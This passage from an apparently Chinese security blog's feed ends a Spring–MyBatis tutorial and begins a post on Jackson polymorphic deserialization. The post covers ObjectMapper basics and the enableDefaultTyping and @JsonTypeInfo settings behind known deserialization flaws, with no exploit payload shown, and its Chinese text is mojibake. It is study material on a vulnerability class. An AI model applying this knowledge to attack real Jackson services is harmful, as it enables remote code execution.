class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMybatis</span><span class="params">()</span>&#123;</span><br><span class="line">        SqlSession sqlSession= MybatisUtil.getSqlsession();</span><br><span class="line">        UserMapper userMapper=sqlSession.getMapper(UserMapper.class);</span><br><span class="line">        List&lt;User&gt; userList=userMapper.getuserlist();</span><br><span class="line">        <span class="keyword">for</span> (User user : userList) &#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172909766.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172909766.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>èƒ½æŸ¥è¯¢ç»“æœå°±æ²¡å•¥é—®é¢˜äº†</p><h3 id="0x02-Spring-æ•´åˆ-Mybatis"><a href="#0x02-Spring-æ•´åˆ-Mybatis" class="headerlink" title="0x02 Spring æ•´åˆ Mybatis"></a>0x02 Spring æ•´åˆ Mybatis</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--    æ³¨æ„è¿™é‡Œ--&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--&lt;context:component-scan base-package=&quot;com.stoocea.mapper&quot;/?--&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--Datasource:ä½¿ç”¨springçš„æ•°æ®æºæ›¿æ¢mybatisçš„é…ç½®,é€‰ä¸€ä¸ªè¿æ¥æ±  c3p0ï¼Œjdbcï¼Œdruid</span></span><br><span class="line"><span class="comment">  è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨springæä¾›çš„jdbcï¼šorg.springframework.jdbc.datasource</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;db.properties&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;datasource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis_study?useSSL=true<span class="symbol">&amp;amp;</span>seUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- è·å–sqlsessionfactory--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlsessionfactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--ç»‘å®šmybatisé…ç½®æ–‡ä»¶--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;datasource&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:mybatis-config.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mapperLocations&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:com/stoocea/Mapper/*.xml&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionTemplate&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sqlsession&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--åªèƒ½ä½¿ç”¨æ„é€ å™¨åˆ›å»ºï¼Œå› ä¸ºæ²¡æœ‰setæ–¹æ³•--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlsessionfactory&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;UserMapper&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Mapper.UserMapperImpl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSessionTemplate&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlsession&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line">package com.stoocea.Mapper;</span><br><span class="line"></span><br><span class="line">import com.stoocea.Pojo.User;</span><br><span class="line">import org.mybatis.spring.SqlSessionTemplate;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class UserMapperImpl implements UserMapper&#123;</span><br><span class="line">    private SqlSessionTemplate sqlSessionTemplate;</span><br><span class="line"></span><br><span class="line">    public void setSqlSessionTemplate(SqlSessionTemplate sqlSessionTemplate) &#123;</span><br><span class="line">        this.sqlSessionTemplate = sqlSessionTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List<span class="tag">&lt;<span class="name">User</span>&gt;</span> getuserlist() &#123;</span><br><span class="line">        UserMapper userMapper=sqlSessionTemplate.getMapper(UserMapper.class);</span><br><span class="line">        return userMapper.getuserlist();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public User getuserbyname(String name) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Boolean adduser(User user) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Boolean deluser(int id) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Boolean cguser(User user) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Boolean mapadduser(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public User getuserbylike(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jackson ååºåˆ—åŒ–(çº¯æµç¨‹æ— POC)</title>
      <link href="/2024/10/11/jackson-fan-xu-lie-hua-liu-cheng-fen-xi-wu-poc/"/>
      <url>/2024/10/11/jackson-fan-xu-lie-hua-liu-cheng-fen-xi-wu-poc/</url>
      
        <content type="html"><![CDATA[<p>pom.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŸºç¡€çŸ¥è¯†ç‚¹ï¼š</p><p><a href="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</a></p><p>ä»¥ä¸‹çŸ¥è¯†å‡æ¥è‡ªä¸Šè¿°é“¾æ¥ï¼Œæœ‰ç©ºè¯·ç§»æ­¥ä»”ç»†é˜…è¯»</p><p>ç»™ä¸ªæ€»ç»“ï¼š</p><h2 id="åŸºç¡€çŸ¥è¯†æ€»ç»“"><a href="#åŸºç¡€çŸ¥è¯†æ€»ç»“" class="headerlink" title="åŸºç¡€çŸ¥è¯†æ€»ç»“"></a>åŸºç¡€çŸ¥è¯†æ€»ç»“</h2><p>jacksonæ˜¯ç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–jsonçš„è§£æå™¨ä¹‹ä¸€</p><p>Jackson çš„æ ¸å¿ƒæ¨¡å—ç”±ä¸‰éƒ¨åˆ†ç»„æˆã€‚</p><ul><li>jackson-coreï¼Œæ ¸å¿ƒåŒ…ï¼Œæä¾›åŸºäºâ€æµæ¨¡å¼â€è§£æçš„ç›¸å…³ APIï¼Œå®ƒåŒ…æ‹¬ JsonPaser å’Œ JsonGeneratorã€‚  Jackson å†…éƒ¨å®ç°æ­£æ˜¯é€šè¿‡é«˜æ€§èƒ½çš„æµæ¨¡å¼ API çš„ JsonGenerator å’Œ JsonParser æ¥ç”Ÿæˆå’Œè§£æ jsonã€‚</li><li>jackson-annotationsï¼Œæ³¨è§£åŒ…ï¼Œæä¾›æ ‡å‡†æ³¨è§£åŠŸèƒ½ï¼›</li><li>jackson-databind ï¼Œæ•°æ®ç»‘å®šåŒ…ï¼Œ æä¾›åŸºäºâ€å¯¹è±¡ç»‘å®šâ€ è§£æçš„ç›¸å…³ API ï¼ˆ ObjectMapper ï¼‰  å’Œâ€æ ‘æ¨¡å‹â€ è§£æçš„ç›¸å…³ API ï¼ˆJsonNodeï¼‰</li></ul><h2 id="ObjectMapper"><a href="#ObjectMapper" class="headerlink" title="ObjectMapper"></a>ObjectMapper</h2><p>ä½¿ç”¨è¯¥å¯¹è±¡çš„æ–¹æ³•ï¼Œå¯ä»¥è§£æJSONåˆ°javaå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æŠŠjavaå¯¹è±¡è½¬åŒ–ä¸ºJSON</p><h3 id="jsonè½¬åŒ–ä¸ºå¯¹è±¡"><a href="#jsonè½¬åŒ–ä¸ºå¯¹è±¡" class="headerlink" title="jsonè½¬åŒ–ä¸ºå¯¹è±¡"></a>jsonè½¬åŒ–ä¸ºå¯¹è±¡</h3><p>å°†jsonè½¬åŒ–ä¸ºå¯¹è±¡codeï¼šï¼ˆéœ€è¦æœ‰Personç±»ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;, \&quot;age\&quot;:30&#125;&quot;</span>;</span><br><span class="line"><span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> objectMapper.readValue(json, Person.class);</span><br></pre></td></tr></table></figure><h3 id="å¯¹è±¡è½¬åŒ–ä¸ºjson"><a href="#å¯¹è±¡è½¬åŒ–ä¸ºjson" class="headerlink" title="å¯¹è±¡è½¬åŒ–ä¸ºjson"></a>å¯¹è±¡è½¬åŒ–ä¸ºjson</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">      <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">      person.setAge(<span class="number">123</span>);</span><br><span class="line">      person.setName(<span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br></pre></td></tr></table></figure><p>å…±æœ‰ä¸‰ç§æ–¹æ³•å¯ä»¥å°†å¯¹è±¡è½¬åŒ–ä¸ºjsonï¼š</p><ul><li>writeValue()</li><li>writeValueAsString()</li><li>writeValueAsBytes()</li></ul><h2 id="JsonParser"><a href="#JsonParser" class="headerlink" title="JsonParser"></a>JsonParser</h2><p>ObjectMapper.readValueå…¶å®åº•å±‚å°±æ˜¯ç”¨çš„JsonParserè¿›è¡Œè§£æã€‚ç®—æ˜¯å¦ä¸€ç§æ›´åº•å±‚çš„è½¬åŒ–æ–¹å¼ï¼Œç”±äºåº•å±‚ï¼Œæ‰€ä»¥é€Ÿåº¦æ›´å¿«</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011101628760.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011101628760.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="jsonè½¬åŒ–ä¸ºå¯¹è±¡-1"><a href="#jsonè½¬åŒ–ä¸ºå¯¹è±¡-1" class="headerlink" title="jsonè½¬åŒ–ä¸ºå¯¹è±¡"></a>jsonè½¬åŒ–ä¸ºå¯¹è±¡</h3><p>JsonParserçš„ä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;fakes0u1\&quot;,\&quot;age\&quot;:123&#125;&quot;</span>;</span><br><span class="line">      <span class="type">JsonFactory</span> <span class="variable">jsonFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>();</span><br><span class="line"><span class="type">JsonParser</span> <span class="variable">parser</span> <span class="operator">=</span> jsonFactory.createParser(json);</span><br></pre></td></tr></table></figure><h3 id="å¯¹è±¡è½¬åŒ–ä¸ºJson"><a href="#å¯¹è±¡è½¬åŒ–ä¸ºJson" class="headerlink" title="å¯¹è±¡è½¬åŒ–ä¸ºJson"></a>å¯¹è±¡è½¬åŒ–ä¸ºJson</h3><p>ä½¿ç”¨JsonGeneratorä»javaå¯¹è±¡ç”ŸæˆJSON</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JsonFactory</span> <span class="variable">jsonFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>();</span><br><span class="line">      <span class="type">Person1</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person1</span>();</span><br><span class="line"><span class="type">JsonGenerator</span> <span class="variable">jsonGenerator</span> <span class="operator">=</span> jsonFactory.createGenerator(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;output.json&quot;</span>), JsonEncoding.UTF8);</span><br><span class="line">      jsonGenerator.writeStartObject();</span><br><span class="line">      jsonGenerator.writeStringField(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">      jsonGenerator.writeNumberField(<span class="string">&quot;age&quot;</span>,<span class="number">123</span>);</span><br><span class="line">      jsonGenerator.writeEndObject();</span><br><span class="line"></span><br><span class="line">      jsonGenerator.close();</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æŠŠæ–‡ä»¶æµæ¢æˆå…¶ä»–æµè¿›è¡Œå†™å…¥</p><h2 id="JacksonPolymorphicDeserialization-æœºåˆ¶"><a href="#JacksonPolymorphicDeserialization-æœºåˆ¶" class="headerlink" title="JacksonPolymorphicDeserialization æœºåˆ¶"></a>JacksonPolymorphicDeserialization æœºåˆ¶</h2><p>ç®€å•åœ°è¯´ï¼ŒJava å¤šæ€å°±æ˜¯åŒä¸€ä¸ªæ¥å£ä½¿ç”¨ä¸åŒçš„å®ä¾‹è€Œæ‰§è¡Œä¸åŒçš„æ“ä½œã€‚</p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœå¯¹å¤šæ€ç±»çš„æŸä¸€ä¸ªå­ç±»å®ä¾‹åœ¨åºåˆ—åŒ–åå†è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå¦‚ä½•èƒ½å¤Ÿä¿è¯ååºåˆ—åŒ–å‡ºæ¥çš„å®ä¾‹å³æ˜¯æˆ‘ä»¬æƒ³è¦çš„é‚£ä¸ªç‰¹å®šå­ç±»çš„å®ä¾‹è€Œéå¤šæ€ç±»çš„å…¶ä»–å­ç±»å®ä¾‹å‘¢ï¼Ÿâ€”â€” Jackson å®ç°äº† JacksonPolymorphicDeserialization æœºåˆ¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p>JacksonPolymorphicDeserialization å³ Jackson  å¤šæ€ç±»å‹çš„ååºåˆ—åŒ–ï¼šåœ¨ååºåˆ—åŒ–æŸä¸ªç±»å¯¹è±¡çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç±»çš„æˆå‘˜å˜é‡ä¸æ˜¯å…·ä½“ç±»å‹ï¼ˆnon-concreteï¼‰ï¼Œæ¯”å¦‚  Objectã€æ¥å£æˆ–æŠ½è±¡ç±»ï¼Œåˆ™å¯ä»¥åœ¨ JSON å­—ç¬¦ä¸²ä¸­æŒ‡å®šå…¶å…·ä½“ç±»å‹ï¼ŒJackson å°†ç”Ÿæˆå…·ä½“ç±»å‹çš„å®ä¾‹ã€‚</p><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯å°†å…·ä½“çš„å­ç±»ä¿¡æ¯ç»‘å®šåœ¨åºåˆ—åŒ–çš„å†…å®¹ä¸­ä»¥ä¾¿äºåç»­ååºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥å¾—åˆ°ç›®æ ‡å­ç±»å¯¹è±¡ï¼Œå…¶å®ç°æœ‰ä¸¤ç§ï¼Œå³ <code>DefaultTyping</code> å’Œ <code>@JsonTypeInfo</code> æ³¨è§£ã€‚è¿™é‡Œå’Œå‰é¢å­¦è¿‡çš„ fastjson æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson æä¾›ä¸€ä¸ª enableDefaultTyping è®¾ç½®ï¼Œè¯¥è®¾ç½®ä½äº<code>jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java</code></p><p>å…±æœ‰ä»¥ä¸‹å››ä¸ªé€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA_LANG_OBJECT</span><br><span class="line">OBJECT_AND_NON_CONCRETE</span><br><span class="line">NON_CONCRETE_AND_ARRAYS</span><br><span class="line">NON_FINAL</span><br></pre></td></tr></table></figure><p>å…ˆç”¨enableDefaultTypingè¿›è¡Œè®¾ç½®ï¼Œå†è°ƒç”¨writeValueAsStringè¿›è¡Œåºåˆ—åŒ–ã€‚å°±ä¼šæŒ‰ç…§å±æ€§ç±»å‹è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚çœ‹ä¸‹caseå§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>(); </span><br><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);</span><br></pre></td></tr></table></figure><p>å·¦è¾¹æ˜¯æ²¡è®¾ç½®enableDefaultTypingï¼Œå³è¾¹æ˜¯è®¾ç½®çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/compare.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/compare.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="compare"></p><p>è¿™å››ä¸ªé€‰é¡¹èƒ½ååºåˆ—åŒ–çš„å±æ€§èŒƒå›´å¦‚ä¸‹ï¼š</p><table><thead><tr><th>DefaultTypingç±»å‹</th><th>èƒ½ååºåˆ—åŒ–çš„å±æ€§</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>å±æ€§çš„ç±»å‹ä¸ºObject</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClassã€Array</td></tr><tr><td>NON_FINAL</td><td>æ‰€æœ‰é™¤äº†å£°æ˜ä¸ºfinalä¹‹å¤–çš„å±æ€§</td></tr></tbody></table><p>**enableDefaultTyping()**é»˜è®¤æ— å‚æ•°è®¾ç½®ä¸ºOBJECT_AND_NON_CONCRETE</p><p>æœ‰çš„ä¸ç†è§£interfaceå’ŒObjectåœ¨è¿™é‡Œçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼š</p><p>æŒ‰CCé“¾æ¥ä¸¾ä¾‹ï¼ŒTransformer[]æ˜¯æ•°ç»„ï¼ŒTransformeræ˜¯æ¥å£ï¼Œè€ŒInvokerTransformerè¿™ç§å°±æ˜¯Object</p><h2 id="JsonTypeInfoæ³¨è§£"><a href="#JsonTypeInfoæ³¨è§£" class="headerlink" title="@JsonTypeInfoæ³¨è§£"></a>@JsonTypeInfoæ³¨è§£</h2><p>å’ŒDefaultTypingåŠŸèƒ½ç±»ä¼¼ï¼ŒJsonTypeInfoæ˜¯ç›´æ¥æ³¨è§£å­—æ®µï¼Œè¾¾åˆ°ç›¸åŒçš„åŠŸèƒ½</p><p>æ¯”å¦‚åœ¨éœ€è¦åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å¯¹è±¡å†…ï¼Œæ ‡è®°Objectå­—æ®µï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span 